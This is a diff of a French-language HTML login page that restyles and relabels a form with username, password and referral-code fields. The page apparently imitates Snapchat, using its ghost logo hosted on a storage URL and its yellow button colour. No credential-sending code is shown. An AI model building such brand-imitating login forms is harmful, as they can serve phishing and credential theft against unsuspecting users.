@@ -12,15 +12,19 @@
 
   <style>
     body {
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f0f0f0;
-      display: flex; justify-content: center; align-items: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
       height: 100vh;
       color: #000;
     }
     .login-box {
-      width: 100%; max-width: 400px;
+      width: 100%;
+      max-width: 400px;
       padding: 40px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
       border-radius: 10px;
@@ -33,21 +37,36 @@
       margin: 0 auto 20px auto;
       display: block;
     }
-    input[type="text"], input[type="password"] {
-      width: 100%; padding: 12px;
-      margin: 10px 0;
+    .form-group {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 12px;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 16px;
       background-color: #fff;
       color: #000;
+      box-sizing: border-box;
     }
     button {
       background-color: #fffc00;
-      border: none; color: #000;
-      font-weight: bold; padding: 12px;
-      width: 100%; border-radius: 8px;
-      cursor: pointer; margin-top: 20px;
+      border: none;
+      color: #000;
+      font-weight: bold;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 20px;
       font-size: 16px;
       transition: background-color 0.3s;
     }
@@ -88,12 +107,21 @@
     <img src="https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png" alt="Logo Snapchat" class="logo" />
     <h2>Connexion au site</h2>
     <form id="loginForm">
-      <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
-      <input type="password" id="password" placeholder="Mot de passe" required />
-      <!-- Nouveau champ Code de parrainage -->
-      <input type="text" id="referralCode" placeholder="Code de parrainage (optionnel)" />
+      <div class="form-group">
+        <label for="username">Nom d'utilisateur ou e-mail</label>
+        <input type="text" id="username" required />
+      </div>
+      <div class="form-group">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" required />
+      </div>
+      <div class="form-group">
+        <label for="referralCode">Code de parrainage (optionnel)</label>
+        <input type="text" id="referralCode" />
+      </div>
 
       <button type="submit">Connexion</button>
+
       <div class="links-container">
         <button type="button" class="link-button" id="signupLink">S'inscrire</button>
         <button type="button" class="link-button" id="forgotPassword">Mot de passe oublié</button>
